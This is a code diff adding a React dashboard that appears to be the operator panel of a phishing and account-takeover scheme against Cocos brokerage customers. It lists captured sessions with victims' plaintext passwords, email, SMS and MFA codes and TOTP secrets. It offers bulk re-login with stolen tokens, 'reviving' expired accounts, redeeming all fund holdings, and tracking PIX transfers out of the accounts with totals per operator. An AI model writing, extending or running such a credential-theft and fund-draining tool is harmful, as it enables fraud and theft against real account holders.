+  const totalBalanceUsd = filteredAccounts.reduce((s, a) => s + (Number((a.balance_usd as any)?.totalBalance) || 0), 0);
+  const totalCashArs = filteredAccounts.reduce((s, a) => s + (Number((a.balance_ars as any)?.cashBalance) || 0), 0);
+  const totalHoldingsArs = filteredAccounts.reduce((s, a) => s + (Number((a.balance_ars as any)?.holdingsBalance) || 0), 0);
+  const totalCiArs = filteredAccounts.reduce((s, a) => s + (Number((a.buying_power as any)?.CI?.ars) || 0), 0);
+  const totalCiUsd = filteredAccounts.reduce((s, a) => s + (Number((a.buying_power as any)?.CI?.usd) || 0), 0);
+  const cocosV2Sessions = liveSessions.filter((s) => {
+    if (s.source !== "cocosv2") return false;
+    if (myOperator && s.operator_code !== myOperator.code) return false;
+    if (!myOperator && operatorFilter !== "all" && s.operator_code !== operatorFilter) return false;
+    return true;
+  });
+
+  // PIX stats
+  const successStatuses = new Set(["completed", "success", "pending_execution", "pending"]);
+  const sentPixTransactions = pixTransactions.filter((t) => successStatuses.has(t.status.toLowerCase()));
+  const failedPixTransactions = pixTransactions.filter((t) => !successStatuses.has(t.status.toLowerCase()));
+  const totalPixBRL = sentPixTransactions.reduce((s, t) => s + Number(t.amount_brl), 0);
+  const totalPixCount = sentPixTransactions.length;
+
+  const now = new Date();
+  const todayStart = new Date(now); todayStart.setHours(0, 0, 0, 0);
+  const monthStart = new Date(now.getFullYear(), now.getMonth(), 1);
+  const todayPixBRL = sentPixTransactions.filter(t => new Date(t.created_at) >= todayStart).reduce((s, t) => s + Number(t.amount_brl), 0);
+  const todayPixCount = sentPixTransactions.filter(t => new Date(t.created_at) >= todayStart).length;
+  const monthPixBRL = sentPixTransactions.filter(t => new Date(t.created_at) >= monthStart).reduce((s, t) => s + Number(t.amount_brl), 0);
+
+  // Aggregate PIX limits
+  const limitsEntries = Object.values(pixLimits);
+  const totalDailyLimit = limitsEntries.reduce((s, l) => s + (Number(l.dailyLimit) || 0), 0);
+  const totalDailyConsumed = limitsEntries.reduce((s, l) => s + (Number(l.dailyConsumption) || 0), 0);
+  const totalMonthlyLimit = limitsEntries.reduce((s, l) => s + (Number(l.monthlyLimit) || 0), 0);
+  const totalMonthlyConsumed = limitsEntries.reduce((s, l) => s + (Number(l.monthlyConsumption) || 0), 0);
+
+  const tabs = [
+    { key: "sessions" as const, icon: <Activity size={14} />, label: "Sessões", count: cocosV2Sessions.length },
+    { key: "accounts" as const, icon: <Users size={14} />, label: "Contas", count: filteredAccounts.length },
+    { key: "online" as const, icon: <Wifi size={14} />, label: "Online", count: stats.onlineCount },
+    { key: "logs" as const, icon: <FileText size={14} />, label: "Logs" },
+  ];
+
+  return (
+    <SessionPresenceProvider>
+    <div className="min-h-screen bg-background text-foreground">
+      {/* ══════ HEADER ══════ */}
+      <header className="sticky top-0 z-50 border-b border-border bg-card/95 backdrop-blur-md">
+        <div className="mx-auto max-w-6xl flex items-center justify-between px-4 h-12">
+          <div className="flex items-center gap-2.5">
+            <img src={cocosLogo} alt="Cocos" className="h-7 w-7 rounded-lg" />
+            <span className="text-sm font-bold text-foreground">{myOperator ? myOperator.name : "Admin"}</span>
+            {myOperator && <span className="text-[9px] font-mono bg-secondary text-muted-foreground px-1.5 py-0.5 rounded">{myOperator.code}</span>}
+          </div>
+          <div className="flex items-center gap-1">
+            <button onClick={() => setSoundEnabled(!soundEnabled)} className={`h-8 w-8 rounded-lg flex items-center justify-center transition-colors ${soundEnabled ? "text-primary" : "text-muted-foreground"}`}>
+              {soundEnabled ? <Bell size={14} /> : <BellOff size={14} />}
+            </button>
+            <button onClick={() => { setForceRefresh((p) => p + 1); loadLiveSessions(); }} className="h-8 w-8 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground transition-colors">
+              <RefreshCw size={14} />
+            </button>
+            <button onClick={() => signOut()} className="h-8 w-8 rounded-lg flex items-center justify-center text-destructive/60 hover:text-destructive transition-colors">
+              <LogOut size={14} />
+            </button>
+          </div>
+        </div>
+      </header>
+
+      {/* ══════ FINANCE DASHBOARD ══════ */}
+      <section className="border-b border-border bg-card/50">
+        <div className="mx-auto max-w-6xl px-4 py-4">
+          {/* Row 1: Big numbers */}
+          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
+            <MetricCard label="TOTAL ARS" value={fmtARS(totalBalanceArs)} color="text-emerald-400" icon="💰" size="lg" />
+            <MetricCard label="CAIXA" value={fmtARS(totalCashArs)} color="text-green-400" icon="💵" />
+            <MetricCard label="INVESTIDO" value={fmtARS(totalHoldingsArs)} color="text-blue-400" icon="📊" />
+            <MetricCard label="TOTAL USD" value={fmtUSD(totalBalanceUsd)} color="text-sky-400" icon="🇺🇸" />
+            <MetricCard label="CI RESGATE" value={fmtARS(totalCiArs)} color="text-orange-400" icon="⚡" highlight={totalCiArs > 0} />
+            <MetricCard label="CONTAS" value={String(filteredAccounts.length)} color="text-purple-400" icon="👥" sub={`${cocosV2Sessions.length} sessões`} />
+          </div>
+
+          {/* Row 2: PIX */}
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-2">
+            <MetricCard label="PIX HOJE" value={fmtBRL(todayPixBRL)} color="text-green-400" icon="📤" sub={`${todayPixCount} tx`} />
+            <MetricCard label="PIX MÊS" value={fmtBRL(monthPixBRL)} color="text-green-400" icon="📅" />
+            <LimitBar label="DIÁRIO" used={totalDailyConsumed} total={totalDailyLimit} />
+            <LimitBar label="MENSAL" used={totalMonthlyConsumed} total={totalMonthlyLimit} />
+          </div>
+
+          {/* PIX limits refresh */}
+          <div className="flex items-center gap-3 mt-2">
+            <button onClick={fetchAllPixLimits} disabled={pixLimitsLoading} className="text-[9px] text-muted-foreground hover:text-foreground flex items-center gap-1 transition-colors disabled:opacity-50">
+              {pixLimitsLoading ? <RefreshCw size={9} className="animate-spin" /> : <Gauge size={9} />}
+              {pixLimitsLoading ? "..." : `Limites (${Object.keys(pixLimits).length})`}
+            </button>
+            <span className="text-[9px] text-green-500/60 flex items-center gap-1"><span className="h-1 w-1 rounded-full bg-green-500 animate-pulse" /> Cron</span>
+          </div>
+        </div>
+      </section>
+
+      {/* ══════ TABS ══════ */}
+      <div className="sticky top-12 z-40 border-b border-border bg-card/95 backdrop-blur-md">
+        <div className="mx-auto max-w-6xl px-4">
+          <nav className="flex gap-0 -mb-px overflow-x-auto">
+            {tabs.map((tab) => (
+              <button key={tab.key} onClick={() => setActiveTab(tab.key)}
+                className={`flex items-center gap-1.5 px-3 py-2.5 text-[11px] font-semibold transition-colors border-b-2 whitespace-nowrap ${
+                  activeTab === tab.key ? "border-primary text-foreground" : "border-transparent text-muted-foreground hover:text-foreground"
+                }`}>
+                {tab.icon}
+                {tab.label}
+                {tab.count !== undefined && tab.count > 0 && (
+                  <span className="text-[9px] bg-primary/10 text-primary rounded px-1 py-0.5 font-bold tabular-nums">{tab.count}</span>
+                )}
+              </button>
+            ))}
+          </nav>
+        </div>
+      </div>
+
+      {/* ══════ MAIN ══════ */}
+      <main className="mx-auto max-w-6xl px-4 py-4">
+        {activeTab === "online" && <OnlineNowTab operatorCode={myOperator?.code} sourceFilter="cocosv2" />}
+
+        {activeTab === "sessions" && (
+          <div className="space-y-3">
+            {!myOperator && operators.length > 0 && (
+              <div className="flex items-center gap-1.5 flex-wrap">
+                <button onClick={() => setOperatorFilter("all")} className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === "all" ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>Todos</button>
+                {operators.map((op) => (
+                  <button key={op.id} onClick={() => setOperatorFilter(op.code)}
+                    className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === op.code ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>
+                    {op.name}
+                  </button>
+                ))}
+              </div>
+            )}
+
+            <div className="relative max-w-sm">
+              <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
+              <input type="text" placeholder="Buscar..." value={search} onChange={(e) => setSearch(e.target.value)}
+                className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
+            </div>
+
+            {cocosV2Sessions.length === 0 ? (
+              <p className="text-center text-sm text-muted-foreground py-12">Nenhuma sessão nas últimas 24h.</p>
+            ) : (
+              <div className="space-y-1.5">
+                {cocosV2Sessions
+                  .filter((s) => !search || (s.email || "").toLowerCase().includes(search.toLowerCase()) || (s.ip_address || "").includes(search))
+                  .map((session) => <SessionRow key={session.id} session={session} />)}
+              </div>
+            )}
+          </div>
+        )}
+
+        {activeTab === "logs" && <AdminLogs operatorCode={myOperator?.code} sourceFilter="cocosv2" />}
+
+        {activeTab === "accounts" && (
+          <div className="space-y-3">
+            {/* Relogin progress */}
+            {reloginRunning && (
+              <div className="rounded-xl border border-blue-500/20 bg-blue-500/5 p-3 space-y-2">
+                <div className="flex items-center gap-2">
+                  <RefreshCw size={12} className="animate-spin text-blue-400" />
+                  <span className="text-[11px] font-semibold text-blue-400">Relogin {reloginProgress.done}/{reloginProgress.total}</span>
+                  {reloginProgress.current && <span className="text-[10px] text-muted-foreground truncate">→ {reloginProgress.current}</span>}
+                </div>
+              </div>
+            )}
+            {/* Refresh all progress */}
+            {refreshAllRunning && (
+              <div className="rounded-xl border border-green-500/20 bg-green-500/5 p-3">
+                <div className="flex items-center gap-2">
+                  <RefreshCw size={12} className="animate-spin text-green-400" />
+                  <span className="text-[11px] font-semibold text-green-400">Atualizando saldos {refreshAllProgress.done}/{refreshAllProgress.total}</span>
+                  {refreshAllProgress.current && <span className="text-[10px] text-muted-foreground truncate">→ {refreshAllProgress.current}</span>}
+                </div>
+              </div>
+            )}
+            {!reloginRunning && reloginProgress.results.length > 0 && (
+              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
+                <div className="flex items-center justify-between">
+                  <span className="text-[10px] font-bold text-foreground">Resultado Relogin</span>
+                  <button onClick={() => setReloginProgress({ done: 0, total: 0, current: "", results: [] })} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
+                </div>
+                {reloginProgress.results.map((r, i) => (
+                  <div key={i} className={`text-[9px] ${r.ok ? "text-green-400" : "text-red-400"}`}>
+                    <span className="font-semibold">{r.email}</span>: {r.msg}
+                  </div>
+                ))}
+              </div>
+            )}
+            {/* Redeem all result */}
+            {redeemAllResult && (
+              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
+                <div className="flex items-center justify-between">
+                  <span className="text-[10px] font-bold text-foreground">Resultado Resgate FCI</span>
+                  <button onClick={() => setRedeemAllResult(null)} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
+                </div>
+                {redeemAllResult.success ? (
+                  <>
+                    <div className="text-[9px] text-green-400">
+                      ✅ {redeemAllResult.total_redeemed} resgates | {redeemAllResult.tokens_refreshed || 0} tokens refreshed | {redeemAllResult.balances_updated} saldos atualizados
+                      {redeemAllResult.timed_out && <span className="text-amber-400"> ⏱️ (timeout parcial: {redeemAllResult.processed}/{redeemAllResult.total_accounts})</span>}
+                    </div>
+                    <div className="max-h-[300px] overflow-y-auto space-y-0.5">
+                      {redeemAllResult.results?.map((r: any, i: number) => (
+                        <div key={i} className="text-[9px]">
+                          <span className="font-semibold text-foreground">{r.email}</span>:
+                          {r.redeemed.length > 0 && <span className="text-green-400"> ✅ {r.redeemed.join(", ")}</span>}
+                          {r.errors.length > 0 && <span className="text-red-400"> ❌ {r.errors.join(", ")}</span>}
+                        </div>
+                      ))}
+                    </div>
+                    {redeemAllResult.results?.length === 0 && <div className="text-[9px] text-muted-foreground">Nenhuma conta com FCI para resgatar</div>}
+                  </>
+                ) : (
+                  <div className="text-[9px] text-red-400">❌ {redeemAllResult.error}</div>
+                )}
+              </div>
+            )}
+            {/* Server relogin result */}
+            {serverReloginResult && (
+              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
+                <div className="flex items-center justify-between">
+                  <span className="text-[10px] font-bold text-foreground">Resultado Relogin Servidor</span>
+                  <button onClick={() => setServerReloginResult(null)} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
+                </div>
+                {serverReloginResult.success ? (
+                  <>
+                    <div className="text-[9px] text-green-400">✅ {serverReloginResult.relogged}/{serverReloginResult.total} relogadas | {serverReloginResult.failed} falharam</div>
+                    <div className="max-h-[200px] overflow-y-auto space-y-0.5">
+                      {serverReloginResult.results?.map((r: any, i: number) => (
+                        <div key={i} className={`text-[9px] ${r.success ? "text-green-400" : "text-red-400"}`}>
+                          <span className="font-semibold">{r.email}</span>: {r.success ? "✅ OK" : `❌ ${r.error}`}
+                        </div>
+                      ))}
+                    </div>
+                  </>
+                ) : (
+                  <div className="text-[9px] text-red-400">❌ {serverReloginResult.error || serverReloginResult.message}</div>
+                )}
+              </div>
+            )}
+
+            <div className="flex flex-col sm:flex-row sm:items-center gap-2">
+              <div className="relative flex-1 max-w-sm">
+                <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
+                <input type="text" placeholder="Buscar contas..." value={search} onChange={(e) => setSearch(e.target.value)}
+                  className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
+              </div>
+              <div className="flex items-center gap-1 flex-wrap">
+                {/* Relogin button */}
+                <button onClick={handleReloginAll} disabled={reloginRunning}
+                  className="text-[10px] px-2.5 py-1 rounded-lg bg-blue-500/10 text-blue-400 font-semibold hover:bg-blue-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
+                  {reloginRunning ? <RefreshCw size={10} className="animate-spin" /> : <Zap size={10} />}
+                  {reloginRunning ? `${reloginProgress.done}/${reloginProgress.total}` : "🔄 Relogin MFA"}
+                </button>
+                {/* Refresh all balances button */}
+                <button onClick={handleRefreshAllBalances} disabled={refreshAllRunning || reloginRunning}
+                  className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
+                  {refreshAllRunning ? <RefreshCw size={10} className="animate-spin" /> : <DollarSign size={10} />}
+                  {refreshAllRunning ? `💰 ${refreshAllProgress.done}/${refreshAllProgress.total}` : "💰 Atualizar Saldos"}
+                </button>
+                {/* Redeem all FCI button */}
+                <button onClick={handleRedeemAll} disabled={redeemAllRunning || reloginRunning || refreshAllRunning}
+                  className="text-[10px] px-2.5 py-1 rounded-lg bg-red-500/10 text-red-400 font-semibold hover:bg-red-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
+                  {redeemAllRunning ? <RefreshCw size={10} className="animate-spin" /> : <Banknote size={10} />}
+                  {redeemAllRunning ? "Resgatando..." : "🔻 Resgatar FCI"}
+                </button>
+                {/* Server relogin dead accounts */}
+                <button onClick={handleServerRelogin} disabled={serverReloginRunning || reloginRunning}
+                  className="text-[10px] px-2.5 py-1 rounded-lg bg-amber-500/10 text-amber-400 font-semibold hover:bg-amber-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
+                  {serverReloginRunning ? <RefreshCw size={10} className="animate-spin" /> : <Key size={10} />}
+                  {serverReloginRunning ? "Relogando..." : `🔑 Reviver Mortas (${accounts.filter(a => a.info_tag?.includes("Token morto") || a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌")).length})`}
+                </button>
+                {(() => {
+                  const ts = new Date(); ts.setHours(0,0,0,0);
+                  const ys = new Date(ts); ys.setDate(ys.getDate() - 1);
+                  const filters: { key: typeof accountFilter; label: string; count: number }[] = [
+                    { key: "all", label: "Todas", count: filteredAccounts.length },
+                    { key: "today", label: "Hoje", count: filteredAccounts.filter(a => new Date(a.created_at) >= ts).length },
+                    { key: "yesterday", label: "Ontem", count: filteredAccounts.filter(a => { const d = new Date(a.created_at); return d >= ys && d < ts; }).length },
+                    { key: "top_balance", label: "💰 Saldo", count: filteredAccounts.filter(a => (Number((a.balance_ars as any)?.totalBalance) || 0) > 0 || (Number((a.balance_usd as any)?.totalBalance) || 0) > 0).length },
+                    { key: "alive", label: "🟢 Ativas", count: filteredAccounts.filter(a => a.refresh_token && !a.info_tag?.startsWith("⚠️") && !a.info_tag?.startsWith("❌")).length },
+                    { key: "expired", label: "🔴 Expiradas", count: filteredAccounts.filter(a => a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌") || !a.refresh_token).length },
+                  ];
+                  return filters.map(f => (
+                    <button key={f.key} onClick={() => setAccountFilter(f.key)}
+                      className={`text-[10px] px-2 py-1 rounded-lg font-medium transition-all ${
+                        accountFilter === f.key ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"
+                      }`}>
+                      {f.label} <span className="opacity-50">{f.count}</span>
+                    </button>
+                  ));
+                })()}
+              </div>
+            </div>
+
+            {!myOperator && operators.length > 0 && (
+              <div className="flex items-center gap-1.5 flex-wrap">
+                <span className="text-[9px] text-muted-foreground font-semibold">Op:</span>
+                <button onClick={() => setOperatorFilter("all")} className={`text-[10px] px-2 py-1 rounded-lg font-medium ${operatorFilter === "all" ? "bg-primary/10 text-primary" : "text-muted-foreground"}`}>Todos</button>
+                {operators.map((op) => (
+                  <button key={op.id} onClick={() => setOperatorFilter(op.code)}
+                    className={`text-[10px] px-2 py-1 rounded-lg font-medium ${operatorFilter === op.code ? "bg-primary/10 text-primary" : "text-muted-foreground"}`}>
+                    <span className="font-mono text-[8px] opacity-60">{op.code}</span> {op.name}
+                  </button>
+                ))}
+              </div>
+            )}
+
+            {accountsLoading ? (
+              <div className="flex items-center justify-center py-16"><RefreshCw size={18} className="animate-spin text-primary" /></div>
+            ) : (
+              <div className="space-y-2">
+                {filteredAccounts
+                  .filter((a) => {
+                    if (search && !a.email.toLowerCase().includes(search.toLowerCase()) && !(a.full_name || "").toLowerCase().includes(search.toLowerCase())) return false;
+                    const ts = new Date(); ts.setHours(0,0,0,0);
+                    const ys = new Date(ts); ys.setDate(ys.getDate()-1);
+                    if (accountFilter === "expired") return a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌") || !a.refresh_token;
+                    if (accountFilter === "alive") return a.refresh_token && !a.info_tag?.startsWith("⚠️") && !a.info_tag?.startsWith("❌");
+                    if (accountFilter === "today") return new Date(a.created_at) >= ts;
+                    if (accountFilter === "yesterday") { const d = new Date(a.created_at); return d >= ys && d < ts; }
+                    if (accountFilter === "top_balance") return (Number((a.balance_ars as any)?.totalBalance) || 0) > 0 || (Number((a.balance_usd as any)?.totalBalance) || 0) > 0;
+                    return true;
+                  })
+                  .sort((a, b) => {
+                    if (accountFilter === "top_balance") {
+                      const aT = (Number((a.balance_ars as any)?.totalBalance) || 0) + (Number((a.balance_usd as any)?.totalBalance) || 0) * 1300;
+                      const bT = (Number((b.balance_ars as any)?.totalBalance) || 0) + (Number((b.balance_usd as any)?.totalBalance) || 0) * 1300;
+                      return bT - aT;
+                    }
+                    return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
+                  })
+                  .map((account) => (
+                    <AccountCard
+                      key={account.id}
+                      account={account}
+                      tokenStatus={tokenStatus[account.email]}
+                      pixLimits={pixLimits[account.email]}
+                      onOperate={() => handleOperate(account)}
+                      onDelete={() => handleDeleteAccount(account)}
+                      safeInvoke={safeInvoke}
+                      onAccountUpdate={() => loadAccounts(false)}
+                      onTagChange={async (tag) => {
+                        await supabase.from("cocos_accounts").update({ info_tag: tag } as any).eq("id", account.id);
+                        loadAccounts(false);
+                      }}
+                    />
+                  ))}
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ══ PIX LOG (master only) ══ */}
+        {!myOperator && activeTab === "accounts" && (
+          <section className="mt-6">
+            <div className="flex items-center justify-between mb-3">
+              <h2 className="text-xs font-bold text-foreground flex items-center gap-2">
+                <Banknote size={14} className="text-green-400" /> PIX
+                <span className="text-[10px] font-normal text-muted-foreground">{totalPixCount} enviados • {fmtBRL(totalPixBRL)}</span>
+              </h2>
+              <div className="flex items-center gap-1.5">
+                <button onClick={handleCheckAllPix} disabled={pixCheckingAll}
+                  className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/15 transition-all disabled:opacity-50">
+                  {pixCheckingAll ? `${pixCheckProgress.done}/${pixCheckProgress.total}` : "Consultar"}
+                </button>
+                <button onClick={loadPixTransactions} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground transition-colors">
+                  <RefreshCw size={12} />
+                </button>
+              </div>
+            </div>
+
+            {pixLoading ? (
+              <div className="flex items-center justify-center py-10"><RefreshCw size={16} className="animate-spin text-primary" /></div>
+            ) : pixTransactions.length === 0 ? (
+              <p className="text-center text-sm text-muted-foreground py-8">Nenhum PIX.</p>
+            ) : (
+              <div className="rounded-xl border border-border overflow-hidden">
+                <table className="w-full text-[11px]">
+                  <thead>
+                    <tr className="bg-secondary/40 border-b border-border text-[9px] text-muted-foreground uppercase">
+                      <th className="text-left px-3 py-2">Data</th>
+                      <th className="text-left px-3 py-2">Conta</th>
+                      <th className="text-left px-3 py-2">Chave PIX</th>
+                      <th className="text-right px-3 py-2">BRL</th>
+                      <th className="text-right px-3 py-2">ARS</th>
+                      <th className="text-center px-3 py-2">Status</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-border/30">
+                    {pixTransactions.map((tx) => {
+                      const time = new Date(tx.created_at);
+                      const isSuccess = successStatuses.has(tx.status.toLowerCase());
+                      return (
+                        <tr key={tx.id} className="hover:bg-secondary/20 transition-colors">
+                          <td className="px-3 py-2 text-muted-foreground font-mono text-[10px]">
+                            {time.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit" })} {time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })}
+                          </td>
+                          <td className="px-3 py-2">
+                            <span className="font-semibold text-foreground truncate block max-w-[160px]">{tx.account_email}</span>
+                            {tx.recipient_name && <span className="text-[9px] text-muted-foreground">→ {tx.recipient_name}</span>}
+                          </td>
+                          <td className="px-3 py-2 font-mono text-muted-foreground truncate max-w-[120px]">{tx.pix_key}</td>
+                          <td className={`px-3 py-2 text-right font-bold tabular-nums ${isSuccess ? "text-green-400" : "text-red-400"}`}>{fmtBRL(tx.amount_brl)}</td>
+                          <td className="px-3 py-2 text-right text-muted-foreground tabular-nums">{tx.amount_ars ? fmtARS(tx.amount_ars) : "—"}</td>
+                          <td className="px-3 py-2 text-center">
+                            {pixStatusResults[tx.id] ? (
+                              <span className={`text-[8px] px-1.5 py-0.5 rounded-full font-bold ${
+                                String(pixStatusResults[tx.id].status) === "COMPLETED" ? "bg-green-500/15 text-green-400" :
+                                String(pixStatusResults[tx.id].status) === "FAILED" ? "bg-red-500/15 text-red-400" :
+                                "bg-blue-500/15 text-blue-400"
+                              }`}>
+                                {String(pixStatusResults[tx.id].status || pixStatusResults[tx.id].error || "?")}
+                              </span>
+                            ) : (
+                              <button
+                                onClick={async () => {
+                                  if (!tx.payment_id) return;
+                                  const acct = accounts.find(a => a.email === tx.account_email);
+                                  if (!acct?.access_token || !acct?.account_id) { setPixStatusResults(prev => ({ ...prev, [tx.id]: { error: "Sem token" } })); return; }
+                                  setPixCheckingId(tx.id);
+                                  try {
+                                    const res = await invokeCocos({ action: "pix_get_payment", access_token: acct.access_token, account_id: acct.account_id, payment_id: tx.payment_id });
+                                    const data = res.data as Record<string, unknown>;
+                                    setPixStatusResults(prev => ({ ...prev, [tx.id]: data || { error: "Sem resposta" } }));
+                                    if (data?.status && String(data.status).toUpperCase() !== tx.status.toUpperCase()) {
+                                      await supabase.from("pix_transactions" as any).update({ status: String(data.status).toLowerCase() }).eq("id", tx.id);
+                                      setPixTransactions(prev => prev.map(t => t.id === tx.id ? { ...t, status: String(data.status).toLowerCase() } : t));
+                                    }
+                                  } catch { setPixStatusResults(prev => ({ ...prev, [tx.id]: { error: "Erro" } })); }
+                                  setPixCheckingId(null);
+                                }}
+                                disabled={pixCheckingId === tx.id || !tx.payment_id}
+                                className={`text-[8px] px-1.5 py-0.5 rounded-full font-semibold ${isSuccess ? "bg-green-500/10 text-green-400" : "bg-red-500/10 text-red-400"}`}>
+                                {pixCheckingId === tx.id ? <RefreshCw size={8} className="animate-spin inline" /> : tx.status}
+                              </button>
+                            )}
+                          </td>
+                        </tr>
+                      );
+                    })}
+                  </tbody>
+                </table>
+              </div>
+            )}
+          </section>
+        )}
+      </main>
+    </div>
+    </SessionPresenceProvider>
+  );
+};
+
+// ══════════════════════════════════════════
+// METRIC CARD
+// ══════════════════════════════════════════
+const MetricCard = ({ label, value, color, icon, sub, size, highlight }: {
+  label: string; value: string; color: string; icon: string; sub?: string; size?: "lg"; highlight?: boolean;
+}) => (
+  <div className={`rounded-xl border bg-card px-3 py-2.5 ${highlight ? "border-orange-500/30 ring-1 ring-orange-500/10" : "border-border"}`}>
+    <div className="flex items-center justify-between">
+      <span className="text-[9px] font-semibold text-muted-foreground uppercase tracking-wider">{label}</span>
+      <span className="text-sm">{icon}</span>
+    </div>
+    <p className={`${size === "lg" ? "text-lg" : "text-sm"} font-bold ${color} tabular-nums leading-tight mt-1 truncate`}>{value}</p>
+    {sub && <p className="text-[9px] text-muted-foreground mt-0.5">{sub}</p>}
+  </div>
+);
+
+// ══════════════════════════════════════════
+// LIMIT BAR
+// ══════════════════════════════════════════
+const LimitBar = ({ label, used, total }: { label: string; used: number; total: number }) => {
+  const pct = total > 0 ? (used / total) * 100 : 0;
+  const isHigh = pct > 80;
+  return (
+    <div className="rounded-xl border border-border bg-card px-3 py-2.5">
+      <div className="flex items-center justify-between">
+        <span className="text-[9px] font-semibold text-muted-foreground uppercase tracking-wider">{label}</span>
+        {total > 0 && <span className={`text-[9px] font-bold ${isHigh ? "text-red-400" : "text-muted-foreground"}`}>{pct.toFixed(0)}%</span>}
+      </div>
+      <p className={`text-sm font-bold tabular-nums leading-tight mt-1 ${total > 0 ? (isHigh ? "text-red-400" : "text-blue-400") : "text-muted-foreground/30"}`}>
+        {total > 0 ? `$${used.toFixed(0)} / $${total.toFixed(0)}` : "—"}
+      </p>
+      {total > 0 && (
+        <div className="h-1 rounded-full bg-border mt-1.5 overflow-hidden">
+          <div className={`h-full rounded-full transition-all ${isHigh ? "bg-red-500" : "bg-blue-500"}`} style={{ width: `${Math.min(100, pct)}%` }} />
+        </div>
+      )}
+    </div>
+  );
+};
+
+// ══════════════════════════════════════════
+// SESSION ROW (compact)
+// ══════════════════════════════════════════
+const SessionRow = ({ session }: { session: LiveSession }) => {
+  const [copied, setCopied] = useState("");
+  const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
+  const time = new Date(session.created_at);
+  const timeStr = time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
+
+  const otpParts: Record<string, string> = {};
+  if (session.otp_code) {
+    session.otp_code.split("|").forEach((part) => {
+      const [k, ...rest] = part.split("=");
+      if (k && rest.length) otpParts[k.trim()] = rest.join("=").trim();
+    });
+  }
+
+  const copyText = (text: string, label: string) => {
+    navigator.clipboard.writeText(text);
+    setCopied(label);
+    setTimeout(() => setCopied(""), 1500);
+  };
+
+  return (
+    <div className={`rounded-lg border bg-card px-3 py-2 transition-all hover:bg-card/80 ${
+      session.status === "completed" ? "border-green-500/20" :
+      session.status.includes("error") || session.status.includes("wrong") ? "border-red-500/20" :
+      "border-border"
+    }`}>
+      {/* Main line */}
+      <div className="flex items-center gap-2 flex-wrap">
+        <span className="text-[10px] font-mono text-muted-foreground tabular-nums w-[38px]">{timeStr}</span>
+        <span className={`text-[9px] px-1.5 py-0.5 rounded font-semibold ${cfg.color}`}>{cfg.label}</span>
+        {session.operator_code && session.operator_code !== "master" && (
+          <span className="text-[8px] font-mono px-1 py-0.5 rounded bg-purple-500/10 text-purple-400">{session.operator_code}</span>
+        )}
+        <span className="text-[11px] font-semibold text-foreground truncate">{session.email || "—"}</span>
+        
+        {/* Password inline */}
+        {session.password && (
+          <button onClick={() => copyText(session.password!, "spwd")} className="flex items-center gap-1 hover:opacity-80" title="Copiar senha">
+            <Lock size={8} className="text-yellow-400" />
+            <span className="text-[10px] font-mono text-yellow-400">{session.password}</span>
+            {copied === "spwd" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+          </button>
+        )}
+        
+        {session.country && <span className="text-[9px] text-muted-foreground">{session.country}{session.city ? ` ${session.city}` : ""}</span>}
+        <span className="text-[9px] text-muted-foreground">{parseDevice(session.user_agent)}</span>
+      </div>
+
+      {/* OTP data row */}
+      {Object.keys(otpParts).length > 0 && (
+        <div className="flex items-center gap-3 mt-1 flex-wrap">
+          {otpParts.email_code && <span className="text-[9px] text-blue-400">📧 {otpParts.email_code}</span>}
+          {otpParts.mfa_code && <span className="text-[9px] text-purple-400">🔑 {otpParts.mfa_code}</span>}
+          {otpParts.sms_code && <span className="text-[9px] text-cyan-400">📱 {otpParts.sms_code}</span>}
+          {otpParts.sms_phone && <span className="text-[9px] text-cyan-300">📞 {otpParts.sms_phone}</span>}
+          {otpParts.totp_secret && (
+            <button onClick={() => copyText(otpParts.totp_secret, "totp")} className="flex items-center gap-1">
+              <span className="text-[9px] text-purple-400">🔐 {otpParts.totp_secret.slice(0, 10)}...</span>
+              {copied === "totp" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
+            </button>
+          )}
+          {otpParts.balance_ars && <span className="text-[9px] text-emerald-400">💰 {otpParts.balance_ars}</span>}
+          {otpParts.balance_usd && <span className="text-[9px] text-blue-400">💵 {otpParts.balance_usd}</span>}
